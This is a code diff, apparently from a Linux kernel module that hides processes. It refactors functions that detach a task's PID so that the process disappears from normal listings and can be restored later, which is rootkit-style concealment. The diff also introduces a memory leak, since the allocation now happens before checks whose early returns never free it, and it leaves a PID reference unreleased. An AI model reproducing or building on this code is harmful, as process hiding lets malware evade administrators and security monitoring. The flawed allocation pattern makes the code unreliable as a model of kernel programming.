@@ -77,9 +77,10 @@ int hideProcess(int pidNumber) {
 		printError("Failed to hide process. Too may processes are hidden.\n");
 		result = -1;
 	} else {
+		RestorableHiddenTask hiddenTask;
 		rcu_read_lock(); 	// hold tasklist_lock / or rcu_read_lock() held. per documentation in pid.h
 
-		RestorableHiddenTask hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
+		hiddenTask = hideProcessGivenRcuLockIsHeld(pidNumber);
 
 
 		if (hiddenTask != NULL) {
@@ -107,36 +108,37 @@ int showProcess(int pid) {
 	return 0;
 }
 
-static RestorableHiddenTask createRestorableTask(struct task_struct *task, struct pid *originalPid, int pidNumber) {
-	RestorableHiddenTask result = kmalloc(sizeof(struct restorableHiddenTask),__GFP_NOWARN);
-
-	if (result != NULL) {
-		result->task = task;
-		result->originalPid = originalPid;
-		result->pidNumber = pidNumber;
-	}
-
-	return result;
-}
-
 static RestorableHiddenTask hideProcessGivenRcuLockIsHeld(int pidNumber) {
 	struct task_struct *task;
 	struct pid *originalPid;
 	struct pid *pid = find_get_pid(pidNumber); //todo: check allocation fo this...
+	RestorableHiddenTask result = kmalloc(sizeof(struct restorableHiddenTask),__GFP_NOWARN);
+
+	if (result == NULL) {
+		printError("failed to allocate memory for restorable hidden task\n");
+		return NULL;
+	}
 
 	if (pid == NULL) {
+		printError("pid not found\n");
 		return NULL;
 	}
 
 	task = pid_task(pid, PIDTYPE_PID);
 
 	if (task == NULL) {
+		printError("task not found\n");
 		return NULL;
 	}
 
 
 	originalPid = detachPidAndGetOldPid(task, PIDTYPE_PID);
-	return createRestorableTask(task, originalPid, pidNumber);
+
+	result->task = task;
+	result->originalPid = originalPid;
+	result->pidNumber = pidNumber;
+
+	return result;
 }
 
 static int notificationFunctionOnTaskExit(struct notifier_block *notifierBlock, unsigned long unknownLong, void *task) {
